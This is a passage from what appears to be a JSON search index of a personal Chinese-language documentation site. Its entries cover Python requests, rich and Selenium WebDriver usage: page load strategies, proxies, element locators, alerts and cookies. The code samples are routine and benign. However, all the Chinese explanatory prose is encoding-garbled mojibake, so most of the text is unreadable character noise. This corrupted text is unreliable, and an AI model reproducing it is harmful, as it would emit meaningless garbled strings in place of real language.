é‚£ä¹ˆè¿™ä¸ªæ—¶å€™å¯èƒ½å°±ä¼š å­˜åœ¨ç»™å®šçš„ä¸‹è½½è·¯å¾„æ­£ç¡®, ä½†å°±æ˜¯è¯´è·¯å¾„ä¸å­˜åœ¨, ä¸‹è½½ä¸äº†, ä¹Ÿæ²¡å‘ä½¿ç”¨pythonæ‰§è¡Œ(è‹¥æ˜¯å¯æ‰§è¡Œæ–‡ä»¶). è¿™ä¸ªæ—¶å€™å¯èƒ½æ˜¯æ–‡ä»¶åçš„å‘½åä½¿ç”¨äº†urlç¼–ç çš„ç¼˜æ•…, è€Œå…¶ä¸­å¯èƒ½æœ‰äº›ç‰¹æ®Šå­—ç¬¦ä¸èƒ½è¢«pythonæ­£å¸¸è§£æ, æ•…è€Œå¯¼è‡´çš„è¿™ä¸ªé—®é¢˜ å°†åç§°ä½¿ç”¨urlè§£ç å³å¯: urllib.parse.unquote(url_path)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-requests.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-requests.html"},{"title":"rich","text":"å…³äºè¿›åº¦æ¡å¯å‚è§: ProgressInPy å®‰è£…: pip install rich ä¸ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/tqdm ä¸€èµ·å¼„å½©è‰²è¿›åº¦æ¡: from tqdm.rich import tqdm, trange def print_hi(): n = 10000 for i in trange(n): for j in range(n): j += i æ•ˆæœ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-rich.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-rich.html"},{"title":"Actionsæ¥å£","text":"å‚è€ƒ: https://www.selenium.dev/zh-cn/documentation/webdriver/actions_api/","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Actions-interface.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Actions-interface.html"},{"title":"æµè§ˆå™¨åŠ è½½é€‰é¡¹","text":"pageLoadStrategy é¡µé¢åŠ è½½ç­–ç•¥: ç­–ç•¥ å°±ç»ªçŠ¶æ€ å¤‡æ³¨ normal complete é»˜è®¤å€¼, ç­‰å¾…æ‰€æœ‰èµ„æºä¸‹è½½ eager interactive DOM è®¿é—®å·²å‡†å¤‡å°±ç»ª, ä½†è¯¸å¦‚å›¾åƒçš„å…¶ä»–èµ„æºå¯èƒ½ä»åœ¨åŠ è½½ none Any å®Œå…¨ä¸ä¼šé˜»å¡ WebDriver ç¤ºä¾‹(Options): from selenium import webdriver from selenium.webdriver.chrome.options import Options options = Options() # é˜»å¡ç­‰å¾…é¡µé¢èµ„æºåŠ è½½ options.page_load_strategy = 'normal' # WebDriverä¸€ç›´ç­‰åˆ° DOMContentLoaded äº‹ä»¶è§¦å‘å¹¶è¿”å›. # options.page_load_strategy = 'eager' # WebDriver ä»…ç­‰å¾…åˆå§‹é¡µé¢å·²ä¸‹è½½. # options.page_load_strategy = 'none' driver = webdriver.Chrome(options=options) driver.get(\"http://www.google.com\") driver.quit() platformName æ ‡è¯†äº†è¿œç«¯çš„æ“ä½œç³»ç»Ÿ, è·å– platformName å°†è¿”å›æ“ä½œç³»ç»Ÿçš„åç§° acceptInsecureCerts æ£€æŸ¥åœ¨ä¼šè¯æœŸé—´å¯¼èˆªæ—¶ æ˜¯å¦ä½¿ç”¨äº†è¿‡æœŸçš„ (æˆ–) æ— æ•ˆçš„ TLS Certificate å¦‚æœå°†åŠŸèƒ½è®¾ç½®ä¸º false, åˆ™é¡µé¢æµè§ˆé‡åˆ°ä»»ä½•åŸŸè¯ä¹¦é—®é¢˜æ—¶, å°†è¿”å›insecure certificate error . å¦‚æœè®¾ç½®ä¸º true, åˆ™æµè§ˆå™¨å°†ä¿¡ä»»æ— æ•ˆè¯ä¹¦. é»˜è®¤æƒ…å†µä¸‹, æ­¤åŠŸèƒ½å°†ä¿¡ä»»æ‰€æœ‰è‡ªç­¾åè¯ä¹¦. è®¾ç½®å, acceptInsecureCerts åŠŸèƒ½å°†åœ¨æ•´ä¸ªä¼šè¯ä¸­ç”Ÿæ•ˆ. timeouts WebDriver session å…·æœ‰ä¸€å®šçš„ session timeout é—´éš”, åœ¨æ­¤é—´éš”å†…, ç”¨æˆ·å¯ä»¥æ§åˆ¶æ‰§è¡Œè„šæœ¬æˆ–ä»æµè§ˆå™¨æ£€ç´¢ä¿¡æ¯çš„è¡Œä¸º. æ¯ä¸ªä¼šè¯è¶…æ—¶éƒ½é…ç½®æœ‰ä¸åŒ timeouts çš„ç»„åˆ, å¦‚ä¸‹æ‰€è¿°: Script Timeout: æŒ‡å®šåœ¨å½“å‰æµè§ˆä¸Šä¸‹æ–‡ä¸­, ä¸­æ–­æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ—¶æœº. WebDriveråˆ›å»ºæ–°ä¼šè¯æ—¶, å°†è®¾ç½®é»˜è®¤çš„è¶…æ—¶æ—¶é—´ä¸º 30,000 . Page Load Timeout: æŒ‡å®šåœ¨å½“å‰æµè§ˆä¸Šä¸‹æ–‡ä¸­, åŠ è½½ç½‘é¡µçš„æ—¶é—´é—´éš”. WebDriveråˆ›å»ºæ–°ä¼šè¯æ—¶, é»˜è®¤è®¾ç½®è¶…æ—¶æ—¶é—´ä¸º 300,000 . å¦‚æœé¡µé¢åŠ è½½é™åˆ¶äº†ç»™å®š (æˆ–é»˜è®¤) çš„æ—¶é—´èŒƒå›´, åˆ™è¯¥è„šæœ¬å°†è¢« TimeoutException åœæ­¢. Implicit Wait Timeout æŒ‡å®šåœ¨å®šä½å…ƒç´ æ—¶, ç­‰å¾…éšå¼å…ƒç´ å®šä½ç­–ç•¥çš„æ—¶é—´. WebDriveråˆ›å»ºæ–°ä¼šè¯æ—¶, å°†è®¾ç½®é»˜è®¤è¶…æ—¶æ—¶é—´ä¸º 0 . unhandledPromptBehavior æŒ‡å®šå½“å‰ä¼šè¯ user prompt handler çš„çŠ¶æ€. é»˜è®¤ä¸º dismiss and notify state . User Prompt Handler è¿™å®šä¹‰äº†åœ¨è¿œç«¯å‡ºç°ç”¨æˆ·æç¤ºæ—¶å¿…é¡»é‡‡å–çš„æªæ–½. è¯¥è¡Œä¸ºç”±unhandledPromptBehavior åŠŸèƒ½å®šä¹‰, å…·æœ‰ä»¥ä¸‹çŠ¶æ€: dismiss accept dismiss and notify accept and notify ignore setWindowRect ç”¨äºæ‰€æœ‰æ”¯æŒ è°ƒæ•´å¤§å°å’Œé‡æ–°å®šä½ å‘½ä»¤ çš„è¿œç¨‹ç»ˆç«¯. strictFileInteractability ç”¨äºæ˜¯å¦å¯¹ ç±»å‹ä¸ºæ–‡ä»¶çš„è¾“å…¥(input type=file) å…ƒç´ è¿›è¡Œä¸¥æ ¼çš„äº¤äº’æ€§æ£€æŸ¥. é»˜è®¤å…³é—­ä¸¥æ ¼æ€§æ£€æŸ¥, åœ¨å°† å…ƒç´ çš„Send Keys æ–¹æ³•ä½œç”¨äºéšè—çš„æ–‡ä»¶ä¸Šä¼ æ—¶, ä¼šæœ‰æ§åˆ¶æ–¹é¢çš„è¡Œä¸ºåŒºåˆ«. proxy ä»£ç†æœåŠ¡å™¨å……å½“å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¯·æ±‚ä¸­ä»‹. ç®€è¿°è€Œè¨€, æµé‡å°†é€šè¿‡ä»£ç†æœåŠ¡å™¨æµå‘æ‚¨è¯·æ±‚çš„åœ°å€, ç„¶åè¿”å›. ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ç”¨äºSeleniumçš„è‡ªåŠ¨åŒ–è„šæœ¬, å¯èƒ½å¯¹ä»¥ä¸‹æ–¹é¢æœ‰ç›Š: æ•è·ç½‘ç»œæµé‡ æ¨¡æ‹Ÿç½‘ç«™åç«¯å“åº” åœ¨å¤æ‚çš„ç½‘ç»œæ‹“æ‰‘ç»“æ„æˆ–ä¸¥æ ¼çš„å…¬å¸é™åˆ¶/æ”¿ç­–ä¸‹è®¿é—®ç›®æ ‡ç«™ç‚¹. å¦‚æœæ‚¨åœ¨å…¬å¸ç¯å¢ƒä¸­, å¹¶ä¸”æµè§ˆå™¨æ— æ³•è¿æ¥åˆ°URL, åˆ™æœ€æœ‰å¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒ, éœ€è¦å€ŸåŠ©ä»£ç†è¿›è¡Œè®¿é—®. è®¾ç½®ä»£ç†çš„æ–¹å¼: from selenium import webdriver PROXY = \"<HOST:PORT>\" webdriver.DesiredCapabilities.FIREFOX['proxy'] = { \"httpProxy\": PROXY, \"ftpProxy\": PROXY, \"sslProxy\": PROXY, \"proxyType\": \"MANUAL\", } with webdriver.Firefox() as driver: # Open URL driver.get(\"https://selenium.dev\")","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Browser-loading-option.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Browser-loading-option.html"},{"title":"å…ƒç´ æ”¯æŒ","text":"æ–‡ä»¶ä¸Šä¼  ä¸èƒ½ç›´æ¥ä¸ä¸Šä¼ çš„Dialogäº¤äº’, ä¸è¿‡å¯¹äº input æ ‡ç­¾çš„ä¸Šä¼ , å¯ä»¥è®¾ç½®è·¯å¾„: file_input = driver.find_element(By.CSS_SELECTOR, \"input[type='file']\") file_input.send_keys(upload_file) driver.find_element(By.ID, \"file-submit\").click() å…ƒç´ æŸ¥æ‰¾ å¯¹äºä»¥ä¸‹å†…å®¹è€Œè¨€: <ol id=\"vegetables\"> <li class=\"potatoes\">â€¦ <li class=\"onions\">â€¦ <li class=\"tomatoes\"><span>Tomato is a Vegetable</span>â€¦ </ol> <ul id=\"fruits\"> <li class=\"bananas\">â€¦ <li class=\"apples\">â€¦ <li class=\"tomatoes\"><span>Tomato is a Fruit</span>â€¦ </ul> æŸ¥è¯¢æŸä¸€ä¸ªæ ‡ç­¾, åªä¼š è¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…çš„å…ƒç´  : vegetable = driver.find_element(By.CLASS_NAME, \"tomatoes\") å¯ä»¥é€šè¿‡ å­å…ƒç´ æŸ¥æ‰¾ : fruits = driver.find_element(By.ID, \"fruits\") fruit = fruits.find_element(By.CLASS_NAME,\"tomatoes\") ä¼˜åŒ–, å¯ä»¥ç›´æ¥ä½¿ç”¨ CSSé€‰æ‹©å™¨ fruit = driver.find_element(By.CSS_SELECTOR,\"#fruits .tomatoes\") è‹¥éœ€è¦ æŸ¥æ‰¾æ‰€æœ‰å…ƒç´  , ä½¿ç”¨ å¤æ•°å½¢å¼(find_elements) æŸ¥æ‰¾: plants = driver.find_elements(By.TAG_NAME, \"li\") è·å–å½“å‰ æ¿€æ´»/èšç„¦çš„å…ƒç´  from selenium import webdriver from selenium.webdriver.common.by import By driver = webdriver.Chrome() driver.get(\"https://www.google.com\") driver.find_element(By.CSS_SELECTOR, '[name=\"q\"]').send_keys(\"webElement\") # Get attribute of current active element attr = driver.switch_to.active_element.get_attribute(\"title\") print(attr) Webå…ƒç´ äº¤äº’ ä»…æœ‰äº”ç§åŸºæœ¬å‘½ä»¤å¯ç”¨äºå…ƒç´ çš„æ“ä½œ: ç‚¹å‡» (é€‚ç”¨äºä»»ä½•å…ƒç´ ) å…ƒç´ ç‚¹å‡»å‘½ä»¤ æ‰§è¡Œåœ¨ å…ƒç´ ä¸­å¤®. å¦‚æœå…ƒç´ ä¸­å¤®ç”±äºæŸäº›åŸå› è¢« é®æŒ¡ , Seleniumå°†è¿”å›ä¸€ä¸ª å…ƒç´ ç‚¹å‡»ä¸­æ–­ é”™è¯¯.: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Click on the element driver.find_element(By.NAME, \"color_input\").click() å‘é€é”®ä½ (ä»…é€‚ç”¨äºæ–‡æœ¬å­—æ®µå’Œå†…å®¹å¯ç¼–è¾‘å…ƒç´ ) å…ƒç´ å‘é€é”®ä½å‘½ä»¤ å°†å½•å…¥æä¾›çš„é”®ä½åˆ° å¯ç¼–è¾‘çš„ å…ƒç´ . é€šå¸¸, è¿™æ„å‘³ç€å…ƒç´ æ˜¯å…·æœ‰ æ–‡æœ¬ ç±»å‹çš„è¡¨å•çš„è¾“å…¥å…ƒç´ æˆ–å…·æœ‰ å†…å®¹å¯ç¼–è¾‘ å±æ€§çš„å…ƒç´ . å¦‚æœä¸å¯ç¼–è¾‘, åˆ™è¿”å› æ— æ•ˆå…ƒç´ çŠ¶æ€ é”™è¯¯.: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Clear field to empty it from any previous data driver.find_element(By.NAME, \"email_input\").clear() # Enter Text driver.find_element(By.NAME, \"email_input\").send_keys(\"admin@localhost.dev\" ) æ¸…é™¤ (ä»…é€‚ç”¨äºæ–‡æœ¬å­—æ®µå’Œå†…å®¹å¯ç¼–è¾‘å…ƒç´ ) å…ƒç´ æ¸…é™¤å‘½ä»¤ é‡ç½®å…ƒç´ çš„å†…å®¹ . è¿™è¦æ±‚å…ƒç´  å¯ç¼–è¾‘ , ä¸” å¯é‡ç½® . é€šå¸¸, è¿™æ„å‘³ç€å…ƒç´ æ˜¯å…·æœ‰ æ–‡æœ¬ ç±»å‹çš„è¡¨å•çš„è¾“å…¥å…ƒç´ æˆ–å…·æœ‰ å†…å®¹å¯ç¼–è¾‘ å±æ€§çš„å…ƒç´ . å¦‚æœä¸æ»¡è¶³è¿™äº›æ¡ä»¶, å°†è¿”å› æ— æ•ˆå…ƒç´ çŠ¶æ€ é”™è¯¯.: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Clear field to empty it from any previous data driver.find_element(By.NAME, \"email_input\").clear() æäº¤ (ä»…é€‚ç”¨äºè¡¨å•å…ƒç´ ) åœ¨Selenium 4ä¸­, ä¸å†é€šè¿‡å•ç‹¬çš„ç«¯ç‚¹ä»¥åŠè„šæœ¬æ‰§è¡Œçš„æ–¹æ³•æ¥å®ç°. å› æ­¤, å»ºè®®ä¸è¦ä½¿ç”¨æ­¤æ–¹æ³•, è€Œæ˜¯å•å‡»ç›¸åº”çš„è¡¨å•æäº¤æŒ‰é’®. é€‰æ‹© (å‚è§ é€‰æ‹©åˆ—è¡¨å…ƒç´ ) è®¾è®¡ç›®çš„æ˜¯å°½é‡æ¨¡æ‹Ÿç”¨æˆ·ä½“éªŒ, ä¼šäº‹å…ˆåšä»¥ä¸‹äº‹æƒ…: å¦‚æœå®ƒç¡®å®šå…ƒç´ åœ¨è§†å£ä¹‹å¤–, åˆ™ä¼šå°†å…ƒç´ æ»šåŠ¨åˆ°è§†å›¾ä¸­, ç‰¹åˆ«æ˜¯å°†å…ƒç´ åº•éƒ¨ä¸è§†å£åº•éƒ¨å¯¹é½ ç¡®ä¿å…ƒç´ åœ¨æ‰§è¡Œæ“ä½œä¹‹å‰æ˜¯å¯äº¤äº’çš„ . è¿™å¯èƒ½æ„å‘³ç€æ»šåŠ¨ä¸æˆåŠŸ, æˆ–è€…è¯¥å…ƒç´ æ²¡æœ‰ä»¥å…¶ä»–æ–¹å¼æ˜¾ç¤º. ç¡®å®šæŸä¸ªå…ƒç´ æ˜¯å¦æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šå¤ªéš¾äº† æ— æ³•ç›´æ¥åœ¨webdriverè§„èŒƒä¸­å®šä¹‰, å› æ­¤Seleniumå‘é€ä¸€ä¸ªå¸¦æœ‰JavaScriptåŸå­çš„æ‰§è¡Œå‘½ä»¤, æ£€æŸ¥æ˜¯å¦æœ‰å¯èƒ½é˜»æ­¢è¯¥å…ƒç´ æ˜¾ç¤º. å¦‚æœç¡®å®šæŸä¸ªå…ƒç´ ä¸åœ¨è§†å£ä¸­, ä¸æ˜¾ç¤º, ä¸å¯ é”®ç›˜äº¤äº’, æˆ–ä¸å¯ æŒ‡é’ˆäº¤äº’, åˆ™è¿”å›ä¸€ä¸ªå…ƒç´ ä¸å¯äº¤äº’ é”™è¯¯ å…ƒç´ å®šä½ç­–ç•¥ åœ¨ WebDriver ä¸­æœ‰ 8 ç§ä¸åŒçš„å†…ç½®å…ƒç´ å®šä½ç­–ç•¥ï¼š å®šä½å™¨ Locator æè¿° class name å®šä½classå±æ€§ä¸æœç´¢å€¼åŒ¹é…çš„å…ƒç´ ï¼ˆä¸å…è®¸ä½¿ç”¨å¤åˆç±»åï¼‰ css selector å®šä½ CSS é€‰æ‹©å™¨åŒ¹é…çš„å…ƒç´  id å®šä½ id å±æ€§ä¸æœç´¢å€¼åŒ¹é…çš„å…ƒç´  name å®šä½ name å±æ€§ä¸æœç´¢å€¼åŒ¹é…çš„å…ƒç´  link text å®šä½link textå¯è§†æ–‡æœ¬ä¸æœç´¢å€¼ å®Œå…¨åŒ¹é… çš„é”šå…ƒç´ . å¦‚ href æ ‡ç­¾å†…çš„æ–‡æœ¬ partial link text å®šä½link textå¯è§†æ–‡æœ¬éƒ¨åˆ†ä¸æœç´¢å€¼ éƒ¨åˆ†åŒ¹é… çš„é”šç‚¹å…ƒç´ ã€‚å¦‚æœåŒ¹é…å¤šä¸ªå…ƒç´ ï¼Œåˆ™åªé€‰æ‹©ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ tag name å®šä½æ ‡ç­¾åç§°ä¸æœç´¢å€¼åŒ¹é…çš„å…ƒç´  xpath å®šä½ä¸ XPath è¡¨è¾¾å¼åŒ¹é…çš„å…ƒç´  ç›¸å¯¹å®šä½å™¨ 4.0æä¾›æ–°åŠŸèƒ½. å‡è®¾æœ‰ä¸€ä¸ªç™»é™†ç•Œé¢: ç”±äºæŸäº›åŸå› ä¸æ–¹ä¾¿ç›´æ¥å®šä½ é‚®ç®± å…ƒç´ , é‚£ä¹ˆå¯ä»¥é€šè¿‡ä¸‹é¢çš„ å¯†ç  å…ƒç´ å®šä½: email_locator = locate_with(By.TAG_NAME, \"input\").above({By.ID: \"password\"}) æ”¯æŒä»¥ä¸‹: Above, æŸå…ƒç´ ä¸Šæ–¹ Below, æŸå…ƒç´ ä¸‹æ–¹: password_locator = locate_with(By.TAG_NAME, \"input\").below({By.ID: \"email\"}) Left of, ä»£ç ä¸­æ˜¯ to_left_of :: cancel_locator = locate_with(By.TAG_NAME, \"button\").to_left_of({By.ID: \"submit\"}) Right of, to_right_of :: submit_locator = locate_with(By.TAG_NAME, \"button\").to_right_of({By.ID: \"cancel\"}) Near, email_locator = locate_with(By.TAG_NAME, \"input\").near({By.ID: \"lbl-email\"}) æ”¯æŒé“¾å¼è°ƒç”¨: submit_locator = locate_with(By.TAG_NAME, \"button\").below({By.ID: \"email\"}).to_right_of({By.ID: \"cancel\"}) ç½‘ç»œå…ƒç´ çš„ä¿¡æ¯ å‚è€ƒ: https://www.selenium.dev/zh-cn/documentation/webdriver/elements/information/ æ”¯æŒä»¥ä¸‹æŸ¥è¯¢: æ˜¯å¦æ˜¾ç¤º: # Navigate to the url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Get boolean value for is element display is_email_visible = driver.find_element(By.NAME, \"email_input\").is_displayed() æ˜¯å¦å¯ç”¨: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Returns true if element is enabled else returns false value = driver.find_element(By.NAME, 'button_input').is_enabled() æ˜¯å¦è¢«é€‰å®š: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Returns true if element is checked else returns false value = driver.find_element(By.NAME, \"checkbox_input\").is_selected() è·å–å…ƒç´ æ ‡ç­¾å: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Returns TagName of the element attr = driver.find_element(By.NAME, \"email_input\").tag_name è·å–å‚ç…§å…ƒç´ çš„å°ºå¯¸å’Œåæ ‡, æ•°æ®ä¸»ä½“åŒ…å«ä»¥ä¸‹è¯¦ç»†ä¿¡æ¯ï¼š å…ƒç´ å·¦ä¸Šè§’çš„Xè½´ä½ç½® å…ƒç´ å·¦ä¸Šè§’çš„yè½´ä½ç½® å…ƒç´ çš„é«˜åº¦ å…ƒç´ çš„å®½åº¦ ä¾‹: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Returns height, width, x and y coordinates referenced element res = driver.find_element(By.NAME, \"range_input\").rect è·å–å…ƒç´ CSSå€¼ # Navigate to Url driver.get('https://www.selenium.dev/selenium/web/colorPage.html') # Retrieves the computed style property 'color' of linktext cssValue = driver.find_element(By.ID, \"namedColor\").value_of_css_property('background-color') è·å–ç‰¹å®šå…ƒç´ æ¸²æŸ“åçš„æ–‡æœ¬å†…å®¹: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/linked_image.html\") # Retrieves the text of the element text = driver.find_element(By.ID, \"justanotherlink\").text è·å–ç‰¹æ€§æˆ–å±æ€§: # Navigate to the url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Identify the email text box email_txt = driver.find_element(By.NAME, \"email_input\") # Fetch the value property associated with the textbox value_info = email_txt.get_attribute(\"value\")","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Element-support.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Element-support.html"},{"title":"Grid-å¹¶è¡Œæ”¯æŒ","text":"å‚è€ƒ: https://www.selenium.dev/zh-cn/documentation/grid/","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Grid-parallel-support.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Grid-parallel-support.html"},{"title":"å®‰è£…","text":"Pythonçš„å®‰è£…: pip install selenium å…¶ä»–è¯­è¨€çš„å®‰è£…å‚è€ƒ: https://www.selenium.dev/zh-cn/documentation/webdriver/getting_started/install_library/ å¦‚Javaçš„ pom.xml : <dependency> <groupId>org.seleniumhq.selenium</groupId> <artifactId>selenium-java</artifactId> <version>4.15.0</version> </dependency>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Install.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Install.html"},{"title":"äº¤äº’","text":"è·å–æµè§ˆå™¨ä¿¡æ¯ è·å–æ ‡é¢˜ ä»æµè§ˆå™¨ä¸­è¯»å–å½“å‰é¡µé¢çš„æ ‡é¢˜: driver.title è·å–å½“å‰ URL: driver.current_url æµè§ˆå™¨å¯¼èˆª å¯åŠ¨æµè§ˆå™¨åçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯æ‰“å¼€ç½‘ç«™: // ç®€ä¾¿çš„æ–¹æ³• driver.get(\"https://selenium.dev\"); // æ›´é•¿çš„æ–¹æ³• driver.navigate().to(\"https://selenium.dev\"); æŒ‰ä¸‹æµè§ˆå™¨çš„åé€€æŒ‰é’®: driver.navigate().back(); æŒ‰ä¸‹æµè§ˆå™¨çš„å‰è¿›é”®: driver.navigate().forward(); åˆ·æ–°é¡µé¢: driver.navigate().refresh(); è­¦å‘Šæ¡† Alerts è­¦å‘Šæ¡† å…¶ä¸­æœ€åŸºæœ¬çš„ç§°ä¸ºè­¦å‘Šæ¡†, å®ƒæ˜¾ç¤ºä¸€æ¡è‡ªå®šä¹‰æ¶ˆæ¯, ä»¥åŠä¸€ä¸ªç”¨äºå…³é—­è¯¥è­¦å‘Šçš„æŒ‰é’®, åœ¨å¤§å¤šæ•°æµè§ˆå™¨ä¸­æ ‡è®°ä¸º\"ç¡®å®š\"(OK). åœ¨å¤§å¤šæ•°æµè§ˆå™¨ä¸­, ä¹Ÿå¯ä»¥é€šè¿‡æŒ‰\"å…³é—­\"(close)æŒ‰é’®å°†å…¶å…³é—­, ä½†è¿™å§‹ç»ˆä¸\"ç¡®å®š\"æŒ‰é’®å…·æœ‰ç›¸åŒçš„ä½œç”¨ WebDriverå¯ä»¥ä»å¼¹çª—è·å–æ–‡æœ¬å¹¶æ¥å—æˆ–å…³é—­è¿™äº›è­¦å‘Š.: # Click the link to activate the alert driver.find_element(By.LINK_TEXT, \"See an example alert\").click() # Wait for the alert to be displayed and store it in a variable alert = wait.until(expected_conditions.alert_is_present()) # Store the alert text in a variable text = alert.text # Press the OK button alert.accept() Confirm ç¡®è®¤æ¡† ç¡®è®¤æ¡†ç±»ä¼¼äºè­¦å‘Šæ¡†, ä¸åŒä¹‹å¤„åœ¨äºç”¨æˆ·è¿˜å¯ä»¥é€‰æ‹©å–æ¶ˆæ¶ˆæ¯. æ­¤ç¤ºä¾‹è¿˜å‘ˆç°äº†è­¦å‘Šçš„å¦ä¸€ç§å®ç°: # Click the link to activate the alert driver.find_element(By.LINK_TEXT, \"See a sample confirm\").click() # Wait for the alert to be displayed wait.until(expected_conditions.alert_is_present()) # Store the alert in a variable for reuse alert = driver.switch_to.alert # Store the alert text in a variable text = alert.text # Press the Cancel button alert.dismiss() Prompt æç¤ºæ¡† æç¤ºæ¡†ä¸ç¡®è®¤æ¡†ç›¸ä¼¼, ä¸åŒä¹‹å¤„åœ¨äºå®ƒä»¬è¿˜åŒ…æ‹¬æ–‡æœ¬è¾“å…¥. ä¸å¤„ç†è¡¨å•å…ƒç´ ç±»ä¼¼, æ‚¨å¯ä»¥ä½¿ç”¨WebDriverçš„sendKeysæ¥å¡«å†™å“åº”. è¿™å°†å®Œå…¨æ›¿æ¢å ä½ç¬¦æ–‡æœ¬. æŒ‰ä¸‹å–æ¶ˆæŒ‰é’®å°†ä¸ä¼šæäº¤ä»»ä½•æ–‡æœ¬: # Click the link to activate the alert driver.find_element(By.LINK_TEXT, \"See a sample prompt\").click() # Wait for the alert to be displayed wait.until(expected_conditions.alert_is_present()) # Store the alert in a variable for reuse alert = Alert(driver) # Type your message alert.send_keys(\"Selenium\") # Press the OK button alert.accept() cookies Cookieæ˜¯ä»ç½‘ç«™å‘é€å¹¶å­˜å‚¨åœ¨æ‚¨çš„è®¡ç®—æœºä¸­çš„ä¸€å°æ®µæ•°æ®. Cookiesä¸»è¦ç”¨äºè¯†åˆ«ç”¨æˆ·å¹¶åŠ è½½å­˜å‚¨çš„ä¿¡æ¯. WebDriver APIæä¾›äº†ä¸€ç§ä½¿ç”¨å†…ç½®çš„æ–¹æ³•ä¸Cookieè¿›è¡Œäº¤äº’: æ·»åŠ  Cookie è¿™ä¸ªæ–¹æ³•å¸¸å¸¸ç”¨äºå°†cookieæ·»åŠ åˆ°å½“å‰è®¿é—®çš„ä¸Šä¸‹æ–‡ä¸­. æ·»åŠ Cookieä»…æ¥å—ä¸€ç»„å·²å®šä¹‰çš„å¯åºåˆ—åŒ–JSONå¯¹è±¡ é¦–å…ˆ, æ‚¨éœ€è¦ä½äºæœ‰æ•ˆCookieçš„åŸŸä¸Š. å¦‚æœæ‚¨åœ¨å¼€å§‹ä¸ç½‘ç«™è¿›è¡Œäº¤äº’ä¹‹å‰å°è¯•é¢„è®¾cookie, å¹¶ä¸”æ‚¨çš„é¦–é¡µå¾ˆå¤§æˆ–éœ€è¦ä¸€æ®µæ—¶é—´æ‰èƒ½åŠ è½½å®Œæ¯•, åˆ™å¯ä»¥é€‰æ‹©åœ¨ç½‘ç«™ä¸Šæ‰¾åˆ°ä¸€ä¸ªè¾ƒå°çš„é¡µé¢: from selenium import webdriver driver = webdriver.Chrome() driver.get(\"http://www.example.com\") # Adds the cookie into current browser context driver.add_cookie({\"name\": \"key\", \"value\": \"value\"}) è·å–å‘½åçš„ Cookie æ­¤æ–¹æ³•è¿”å›ä¸cookieåç§°åŒ¹é…çš„åºåˆ—åŒ–cookieæ•°æ®ä¸­æ‰€æœ‰å…³è”çš„cookie.: from selenium import webdriver driver = webdriver.Chrome() # Navigate to url driver.get(\"http://www.example.com\") # Adds the cookie into current browser context driver.add_cookie({\"name\": \"foo\", \"value\": \"bar\"}) # Get cookie details with named cookie 'foo' print(driver.get_cookie(\"foo\")) è·å–å…¨éƒ¨ Cookies æ­¤æ–¹æ³•ä¼šé’ˆå¯¹å½“å‰è®¿é—®ä¸Šä¸‹æ–‡è¿”å›\"æˆåŠŸçš„åºåˆ—åŒ–cookieæ•°æ®\". å¦‚æœæµè§ˆå™¨ä¸å†å¯ç”¨, åˆ™è¿”å›é”™è¯¯.: from selenium import webdriver driver = webdriver.Chrome() # Navigate to url driver.get(\"http://www.example.com\") driver.add_cookie({\"name\": \"test1\", \"value\": \"cookie1\"}) driver.add_cookie({\"name\": \"test2\", \"value\": \"cookie2\"}) # Get all available cookies print(driver.get_cookies()) åˆ é™¤ Cookie æ­¤æ–¹æ³•åˆ é™¤ä¸æä¾›çš„cookieåç§°åŒ¹é…çš„cookieæ•°æ®.: from selenium import webdriver driver = webdriver.Chrome() # Navigate to url driver.get(\"http://www.example.com\") driver.add_cookie({\"name\": \"test1\", \"value\": \"cookie1\"}) driver.add_cookie({\"name\": \"test2\", \"value\": \"cookie2\"}) # Delete a cookie with name 'test1' driver.delete_cookie(\"test1\") åˆ é™¤æ‰€æœ‰ Cookies æ­¤æ–¹æ³•åˆ é™¤å½“å‰è®¿é—®ä¸Šä¸‹æ–‡çš„æ‰€æœ‰cookie.: from selenium import webdriver driver = webdriver.Chrome() # Navigate to url driver.get(\"http://www.example.com\") driver.add_cookie({\"name\": \"test1\", \"value\": \"cookie1\"}) driver.add_cookie({\"name\": \"test2\", \"value\": \"cookie2\"}) # Deletes all cookies driver.delete_all_cookies() Same-Site Cookieå±æ€§ æ­¤å±æ€§å…è®¸ç”¨æˆ·å¼•å¯¼æµè§ˆå™¨æ§åˆ¶cookie, æ˜¯å¦ä¸ç¬¬ä¸‰æ–¹ç«™ç‚¹å‘èµ·çš„è¯·æ±‚ä¸€èµ·å‘é€. 